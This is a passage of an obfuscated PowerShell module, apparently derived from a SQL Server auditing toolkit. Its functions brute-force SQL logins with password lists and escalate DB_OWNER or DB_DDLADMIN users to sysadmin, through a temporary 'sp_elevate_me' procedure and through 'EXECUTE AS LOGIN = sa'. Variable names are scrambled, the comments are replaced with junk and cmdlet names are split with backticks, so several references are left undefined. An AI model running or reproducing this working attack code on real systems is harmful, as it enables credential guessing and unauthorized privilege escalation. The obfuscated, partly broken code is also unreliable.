        HelpMessage = 'User is tested as pass by default. This setting disables it.')]
        [switch]$IcicleNumber,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't attempt to enumerate logins from the server.")]
        [switch]$LeanSteel,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of Principal IDs to fuzz.')]
        [string]$WoodenFoamy = 10000,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')
    }

    Process
    {
        # Microsoft".
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Weak Login Password"

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Weak Login Password."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $JoyousLeft = $SmilePie.CurrentLogin
        $HauntGusty = $SmilePie.ComputerName
        $MotherSix = $SmilePie.IsSysadmin

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal)
        {
            $ArgueHeavy  = 'Exploit'
        }
        else
        {
            $ArgueHeavy  = 'Audit'
        }
        $HorsesWhole = 'Weak Login Password'
        $EyesSmile   = 'One or more SQL Server logins is configured with a weak password.  This may provide unauthorized access to resources the affected logins have access to.'
        $BeliefNote   = 'Ensure all SQL Server logins are required to use a strong password. Consider inheriting the OS password policy.'
        $ScorchEarth      = 'High'
        $CurveUseful  = 'No'
        $PourSkip = 'No'
        $PinPlease     = 'No'
        $DeathBlot    = 'Use the affected credentials to log into the SQL Server, or rerun this command with -RotLethal.'
        $GlowHorses       = ''
        $KittyPolite     = 'https://msdn.microsoft.com/en-us/library/ms161959.aspx'
        $CheeseFood        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".

        # Microsoft".
        $DoubtLean = @()
        $ZanyExtend = @()

        # Microsoft".
        if($SuddenBitter)
        {
            Write-Verbose -Message "$Instance - Getting logins from file..."
            Get-Content -Path $SuddenBitter |
            ForEach-Object -Process {
                $DoubtLean += $_
            }
        }

        # Microsoft".
        if($SongsSoup)
        {
            Write-Verbose -Message "$Instance - Getting supplied login..."
            $DoubtLean += $SongsSoup
        }

        # Microsoft".
        if(-not $LeanSteel)
        {
            # Microsoft".
            $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
                $_.Status -eq 'Accessible'
            }
            if($HoneyHusky)
            {
                # Microsoft".
                $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                if($LovingDry -eq 'Yes')
                {
                    # Microsoft".
                    Write-Verbose -Message "$Instance - Getting list of logins..."
                    Get-SQLServerLogin -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill |
                    Where-Object -FilterScript {
                        $_.PrincipalType -eq 'SQL_LOGIN'
                    } |
                    Select-Object -Property PrincipalName -ExpandProperty PrincipalName |
                    ForEach-Object -Process {
                        $DoubtLean += $_
                    }
                }
                else
                {
                    # Microsoft".
                    Write-Verbose -Message "$Instance : Enumerating principal names from $WoodenFoamy principal IDs.."
                    Get-SQLFuzzServerLogin -Instance $Instance -PickSparkElated -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -WoodenFoamy $WoodenFoamy -RaggedQuill |
                    Where-Object -FilterScript {
                        $_.PrincipleType -eq 'SQL Login'
                    } |
                    Select-Object -Property PrincipleName -ExpandProperty PrincipleName |
                    ForEach-Object -Process {
                        $DoubtLean += $_
                    }
                }
            }
            else
            {
                if( -not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance - Connection Failed - Could not authenticate with provided credentials."
                }
                return
            }
        }

        # Microsoft".
        if($DoubtLean.count -eq 0 -and (-not $CuddlyChubby))
        {
            Write-Verbose -Message "$Instance - No logins have been provided."
            return
        }

        # Microsoft".
        if($SlapTub)
        {
            Write-Verbose -Message "$Instance - Getting password from file..."
            Get-Content -Path $SlapTub |
            ForEach-Object -Process {
                $ZanyExtend += $_
            }
        }

        # Microsoft".
        if($SadAblaze)
        {
            Write-Verbose -Message "$Instance - Getting supplied password..."
            $ZanyExtend += $SadAblaze
        }

        # Microsoft".
        if($ZanyExtend.count -eq 0 -and ($IcicleNumber))
        {
            Write-Verbose -Message "$Instance - No passwords have been provided."
            return
        }

        # Microsoft".
        Write-Verbose -Message "$Instance - Performing dictionary attack..."
        $DoubtLean |
        Select-Object -Unique |
        ForEach-Object -Process {
            $CobwebBounce = $_
            $ZanyExtend |
            Select-Object -Unique |
            ForEach-Object -Process {
                $AblazeVan = $_

                $EightRapid = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $CobwebBounce -EasyAlert $AblazeVan -RaggedQuill |
                Where-Object -FilterScript {
                    $_.Status -eq 'Accessible'
                }
                if($EightRapid)
                {
                    # Microsoft".
                    $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $CobwebBounce -EasyAlert $AblazeVan -RaggedQuill |
                    Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                    if($LovingDry -eq 'Yes')
                    {
                        $SongsBolt = 'Sysadmin'
                    }
                    else
                    {
                        $SongsBolt = 'Not Sysadmin'
                    }

                    Write-Verbose -Message "$Instance - Successful Login: User = $CobwebBounce ($SongsBolt) Password = $AblazeVan"

                    if($RotLethal)
                    {
                        Write-Verbose -Message "$Instance - Trying to make you a sysadmin..."

                        # Microsoft".
                        $DebtHarm = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill |
                        Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                        if($DebtHarm -eq 'Yes')
                        {
                            Write-Verbose -Message "$Instance - You're already a sysadmin. Nothing to do."
                        }
                        else
                        {
                            Write-Verbose -Message "$Instance - You're not currently a sysadmin. Let's change that..."

                            # Microsoft".
                            Get-SQLQuery -Instance $Instance -AnimalWeary $CobwebBounce -EasyAlert $AblazeVan -Credential $Credential -BoringLarge "EXEC sp_addsrvrolemember '$JoyousLeft','sysadmin'" -RaggedQuill

                            # Microsoft".
                            $SelfHelp = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill |
                            Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                            if($SelfHelp -eq 'Yes')
                            {
                                $PinPlease = 'Yes'
                                Write-Verbose -Message "$Instance - SUCCESS! You're a sysadmin now."
                            }
                            else
                            {
                                $PinPlease = 'No'
                                Write-Verbose -Message "$Instance - Fail. We coudn't add you as a sysadmin."
                            }
                        }
                    }

                    # Microsoft".
                    $GlowHorses = "The $CobwebBounce ($SongsBolt) is configured with the password $AblazeVan."
                    $CurveUseful = 'Yes'
                    $PourSkip = 'Yes'
                    $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
                }
                else
                {
                    Write-Verbose -Message "$Instance - Failed Login: User = $CobwebBounce Password = $AblazeVan"
                }
            }
        }

        # Microsoft".
        if(-not $IcicleNumber)
        {
            $DoubtLean |
            Select-Object -Unique |
            ForEach-Object -Process {
                $CobwebBounce = $_
                $EightRapid = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $CobwebBounce -EasyAlert $CobwebBounce -RaggedQuill |
                Where-Object -FilterScript {
                    $_.Status -eq 'Accessible'
                }
                if($EightRapid)
                {
                    # Microsoft".
                    $MarkEasy = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $CobwebBounce -EasyAlert $CobwebBounce -RaggedQuill |
                    Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                    if($MarkEasy -eq 'Yes')
                    {
                        $SongsBolt = 'Sysadmin'
                    }
                    else
                    {
                        $SongsBolt = 'Not Sysadmin'
                    }

                    Write-Verbose -Message "$Instance - Successful Login: User = $CobwebBounce ($SongsBolt) Password = $CobwebBounce"

                    if(($RotLethal) -and $MarkEasy -eq 'Yes')
                    {
                        # Microsoft".
                        $AlertWomen = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill |
                        Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                        if($AlertWomen -eq 'Yes')
                        {
                            Write-Verbose -Message "$Instance - You're already a sysadmin. Nothing to do."
                        }
                        else
                        {
                            Write-Verbose -Message "$Instance - You're not currently a sysadmin. Let's change that..."

                            # Microsoft".
                            Get-SQLQuery -Instance $Instance -AnimalWeary $CobwebBounce -EasyAlert $CobwebBounce -Credential $Credential -BoringLarge "EXEC sp_addsrvrolemember '$JoyousLeft','sysadmin'" -RaggedQuill

                            # Microsoft".
                            $ScreamPeep = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill |
                            Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                            if($ScreamPeep -eq 'Yes')
                            {
                                $PinPlease = 'Yes'
                                Write-Verbose -Message "$Instance - SUCCESS! You're a sysadmin now."
                            }
                            else
                            {
                                $PinPlease = 'No'
                                Write-Verbose -Message "$Instance - Fail. We coudn't add you as a sysadmin."
                            }
                        }
                    }

                    # Microsoft".
                    $GlowHorses = "The $CobwebBounce ($SongsBolt) principal is configured with the password $CobwebBounce."
                    $CurveUseful = 'Yes'
                    $PourSkip = 'Yes'
                    $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
                }
                else
                {
                    Write-Verbose -Message "$Instance - Failed Login: User = $CobwebBounce Password = $CobwebBounce"
                }
            }
        }


        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".


        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".

        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Weak Login Password"
    }

    End
    {
        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze | Sort-Object -Property computername, instance, details
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLAuditRoleDbOwner
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')
    }

    Process
    {
        # Microsoft".
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : CONNECTION FAILED"
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
        }

        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $HauntGusty = $SmilePie.ComputerName
        $JoyousLeft = $SmilePie.CurrentLogin
        $LewdLunch = Get-SQLServerRoleMember -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BasinEnter $JoyousLeft  -RaggedQuill
        $SmellFlavor = @()
        $SmellFlavor += $JoyousLeft
        $SmellFlavor += 'Public'
        $LewdLunch | ForEach-Object -Process {
            $SmellFlavor += $_.RolePrincipalName
        }

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal)
        {
            $ArgueHeavy  = 'Exploit'
        }
        else
        {
            $ArgueHeavy  = 'Audit'
        }
        $HorsesWhole = 'DATABASE ROLE - DB_OWNER'
        $EyesSmile   = 'The login has the DB_OWER role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and owned by a sysadmin.'
        $BeliefNote   = "If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_OWNER', 'MyDbUser', and can be removed with a command like:  EXEC sp_droprolemember 'DB_OWNER', 'MyDbUser'"
        $ScorchEarth      = 'Medium'
        $CurveUseful  = 'No'
        $PourSkip = 'No'
        $PinPlease     = 'No'
        if($AnimalWeary)
        {
            $DeathBlot    = "Invoke-SQLAuditRoleDbOwner -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RotLethal"
        }
        else
        {
            $DeathBlot    = "Invoke-SQLAuditRoleDbOwner -Instance $Instance -RotLethal"
        }
        $GlowHorses       = ''
        $LickBadge = 'Affected databases must be owned by a sysadmin and be trusted.'
        $KittyPolite     = 'https://msdn.microsoft.com/en-us/library/ms189121.aspx,https://msdn.microsoft.com/en-us/library/ms187861.aspx'
        $CheeseFood        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".

        # Microsoft".
        $SmellFlavor|
        ForEach-Object -Process {
            # Microsoft".
            $SkipRoom = Get-SQLDatabaseRoleMember -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -PrettyPie DB_OWNER -BasinEnter $_ -RaggedQuill

            # Microsoft".
            # Microsoft".
            # Microsoft".
            # Microsoft".

            # Microsoft".
            if($SkipRoom)
            {
                # Microsoft".
                $SkipRoom|
                ForEach-Object -Process {
                    $GrabBall = $_.DatabaseName
                    $TrucksOffice = $_.PrincipalName

                    Write-Verbose -Message "$Instance : - $TrucksOffice has the DB_OWNER role in the $GrabBall database."
                    $CurveUseful = 'Yes'

                    # Microsoft".
                    $WreckString = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $GrabBall -RaggedQuill | Where-Object -FilterScript {
                        $_.is_trustworthy_on -eq 1 -and $_.OwnerIsSysadmin -eq 1
                    }

                    if($WreckString)
                    {
                        $PourSkip = 'Yes'
                        Write-Verbose -Message "$Instance : - The $GrabBall database is set as trustworthy and is owned by a sysadmin. This is exploitable."

                        # Microsoft".
                        # Microsoft".
                        # Microsoft".
                        # Microsoft".
                        if($RotLethal)
                        {
                            # Microsoft".
                            $WickedSteel = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge "SELECT IS_SRVROLEMEMBER('sysadmin','$JoyousLeft') as Status" -RaggedQuill | Select-Object -Property Status -ExpandProperty Status
                            if($WickedSteel -ne 1)
                            {
                                # Microsoft".
                                Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($JoyousLeft) is NOT a sysadmin."
                                Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($JoyousLeft) to the sysadmin role by using DB_OWNER permissions..."

                                $BubbleExpand = "CREATE PROCEDURE sp_elevate_me
                                    WITH EXECUTE AS OWNER
                                    AS
                                    begin
                                    EXEC sp_addsrvrolemember '$JoyousLeft','sysadmin'
                                end;"

                                # Microsoft".
                                $null = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge "$BubbleExpand" -RaggedQuill -PeckLively $GrabBall

                                # Microsoft".
                                $null = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge 'sp_elevate_me' -RaggedQuill -PeckLively $GrabBall

                                # Microsoft".
                                $null = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge 'DROP PROC sp_elevate_me' -RaggedQuill -PeckLively $GrabBall

                                # Microsoft".
                                $JokeRude = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge "SELECT IS_SRVROLEMEMBER('sysadmin','$JoyousLeft') as Status" -RaggedQuill | Select-Object -Property Status -ExpandProperty Status
                                if($JokeRude -eq 1)
                                {
                                    Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($JoyousLeft) a sysadmin!"
                                    $PinPlease = 'Yes'
                                }
                                else
                                {

                                }
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($JoyousLeft) a sysadmin."
                            }

                            # Microsoft".
                            $GlowHorses = "$TrucksOffice has the DB_OWNER role in the $GrabBall database."
                            $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
                        }
                        else
                        {
                            # Microsoft".
                            $GlowHorses = "$TrucksOffice has the DB_OWNER role in the $GrabBall database."
                            $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
                        }
                    }
                    else
                    {
                        # Microsoft".
                        Write-Verbose -Message "$Instance : - The $GrabBall is not exploitable."
                        $GlowHorses = "$TrucksOffice has the DB_OWNER role in the $GrabBall database, but this was not exploitable."
                        $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
                    }
                }
            }
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"
    }

    End
    {
        # Microsoft".
        if ( -not $CattleEnter)
        {
            Return $CanGaze
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Invoke-SQLAuditRoleDbDdlAdmin
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$CattleEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$RotLethal
    )

    Begin
    {
        # Microsoft".
        $CanGaze = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $CanGaze.Columns.Add('ComputerName')
        $null = $CanGaze.Columns.Add('Instance')
        $null = $CanGaze.Columns.Add('Vulnerability')
        $null = $CanGaze.Columns.Add('Description')
        $null = $CanGaze.Columns.Add('Remediation')
        $null = $CanGaze.Columns.Add('Severity')
        $null = $CanGaze.Columns.Add('IsVulnerable')
        $null = $CanGaze.Columns.Add('IsExploitable')
        $null = $CanGaze.Columns.Add('Exploited')
        $null = $CanGaze.Columns.Add('ExploitCmd')
        $null = $CanGaze.Columns.Add('Details')
        $null = $CanGaze.Columns.Add('Reference')
        $null = $CanGaze.Columns.Add('Author')
    }

    Process
    {
        # Microsoft".
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: DATABASE ROLE - DB_DDLAMDIN"

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $HoneyHusky)
        {
            # Microsoft".
            Write-Verbose -Message "$Instance : CONNECTION FAILED"
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_DDLADMIN"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
        }

        # Microsoft".
        $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $HauntGusty = $SmilePie.ComputerName
        $JoyousLeft = $SmilePie.CurrentLogin
        $LewdLunch = Get-SQLServerRoleMember -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BasinEnter $JoyousLeft  -RaggedQuill
        $SmellFlavor = @()
        $SmellFlavor += $JoyousLeft
        $SmellFlavor += 'Public'
        $LewdLunch | ForEach-Object -Process {
            $SmellFlavor += $_.RolePrincipalName
        }

        # Microsoft".
        # Microsoft".
        # Microsoft".
        if($RotLethal)
        {
            $ArgueHeavy  = 'Exploit'
        }
        else
        {
            $ArgueHeavy  = 'Audit'
        }
        $HorsesWhole = 'DATABASE ROLE - DB_DDLADMIN'
        $EyesSmile   = 'The login has the DB_DDLADMIN role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and owned by a sysadmin, or if a custom assembly can be loaded.'
        $BeliefNote   = "If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_DDLADMIN', 'MyDbUser', and can be removed with a command like:  EXEC sp_droprolemember 'DB_DDLADMIN', 'MyDbUser'"
        $ScorchEarth      = 'Medium'
        $CurveUseful  = 'No'
        $PourSkip = 'No'
        $PinPlease     = 'No'
        $DeathBlot    = 'No exploit command is available at this time, but a custom assesmbly could be used.'
        $GlowHorses       = ''
        $LickBadge  = 'Affected databases must be owned by a sysadmin and be trusted. Or it must be possible to load a custom assembly configured for external access.'
        $KittyPolite     = 'https://technet.microsoft.com/en-us/library/ms189612(v=sql.105).aspx'
        $CheeseFood        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # Microsoft".
        # Microsoft".
        # Microsoft".
        # Microsoft".

        # Microsoft".
        $SmellFlavor|
        ForEach-Object -Process {
            # Microsoft".
            $BoltBait = Get-SQLDatabaseRoleMember -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -PrettyPie DB_DDLADMIN -BasinEnter $_ -RaggedQuill

            # Microsoft".
            # Microsoft".
            # Microsoft".
            # Microsoft".

            # Microsoft".
            if($BoltBait)
            {
                # Microsoft".
                $BoltBait|
                ForEach-Object -Process {
                    $GrabBall = $_.DatabaseName
                    $TrucksOffice = $_.PrincipalName

                    Write-Verbose -Message "$Instance : - $TrucksOffice has the DB_DDLADMIN role in the $GrabBall database."
                    $CurveUseful = 'Yes'

                    # Microsoft".
                    $WreckString = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $GrabBall -RaggedQuill | Where-Object -FilterScript {
                        $_.is_trustworthy_on -eq 1 -and $_.OwnerIsSysadmin -eq 1
                    }

                    if($WreckString)
                    {
                        $PourSkip = 'No'
                        Write-Verbose -Message "$Instance : - The $GrabBall database is set as trustworthy and is owned by a sysadmin. This is exploitable."

                        # Microsoft".
                        # Microsoft".
                        # Microsoft".
                        # Microsoft".
                        if($RotLethal)
                        {
                            # Microsoft".
                            $WickedSteel = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge "SELECT IS_SRVROLEMEMBER('sysadmin','$JoyousLeft') as Status" -RaggedQuill | Select-Object -Property Status -ExpandProperty Status
                            if($WickedSteel -ne 1)
                            {
                                # Microsoft".
                                Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($JoyousLeft) is NOT a sysadmin."
                                Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($JoyousLeft) to the sysadmin role by using DB_OWNER permissions..."

                                # Microsoft".
                                $null = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge "EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '$JoyousLeft','sysadmin';Revert" -RaggedQuill

                                # Microsoft".
                                $JokeRude = Get-SQLQuery -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -BoringLarge "SELECT IS_SRVROLEMEMBER('sysadmin','$JoyousLeft') as Status" -RaggedQuill | Select-Object -Property Status -ExpandProperty Status
                                if($JokeRude -eq 1)
                                {
                                    Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($JoyousLeft) a sysadmin!"
                                    $PinPlease = 'Yes'
                                }
                                else
                                {

                                }
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($JoyousLeft) a sysadmin."
                            }

                            # Microsoft".
                            $GlowHorses = "$TrucksOffice has the DB_DDLADMIN role in the $GrabBall database."
                            $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
                        }
                        else
                        {
                            # Microsoft".
                            $GlowHorses = "$TrucksOffice has the DB_DDLADMIN role in the $GrabBall database."
                            $null = $CanGaze.Rows.Add($HauntGusty, $Instance, $HorsesWhole, $EyesSmile, $BeliefNote, $ScorchEarth, $CurveUseful, $PourSkip, $PinPlease, $DeathBlot, $GlowHorses, $KittyPolite, $CheeseFood)
                        }
                    }
                    else
                    {
                        # Microsoft".
                        Write-Verbose -Message "$Instance : - The $GrabBall is not exploitable."
                        $GlowHorses = "$TrucksOffice has the DB_DDLADMIN role in the $GrabBall database, but this was not exploitable."
